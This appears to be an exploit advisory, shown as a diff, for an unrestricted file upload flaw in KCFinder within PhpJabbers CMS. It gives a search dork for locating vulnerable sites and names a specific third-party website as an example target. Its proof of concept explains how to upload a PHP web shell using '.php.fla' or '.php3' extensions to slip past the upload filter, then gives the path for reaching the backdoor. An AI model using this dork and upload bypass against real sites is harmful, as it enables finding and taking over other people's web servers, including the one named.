@@ -1,0 +1,19 @@
+Exploit Title   : KCFinder File Upload In PhpJabbers
+Author          : ice-cream - khunerable
+Vendor Homepage : http://www.phpjabbers.com/
+Vendor Github   : -
+Date            : 10 dec 2017
+Tested on       : Ubuntu 16.04.2 LTS ( BackBox ), Windows 7
+
+-------------------------------------------------------------
+Dork       : inurl:/cms/app/web/
+Bug Victim : http://localhost/[path]/core/libs/kcfinder/browse.php
+Example    : https://www.hardyfarmspeanuts.com/cms/core/libs/kcfinder/browse.php
+
+POC :
+[-] Upload Ur Shell [.php.fla] or [.php3]
+[-] if done, u can access full ur backdoor [ NB : not all web's can upload .php.fla or .php3]
+
+Path Shell : http://localhost/[path]/app/web/upload/files/urshell.php
+
+THNK'S TO : Pak Haxor - Grac3 - Lastc0de - KONSLET - SPEEDY03 - AnoaGhost And All Typical Idiot Security Member's
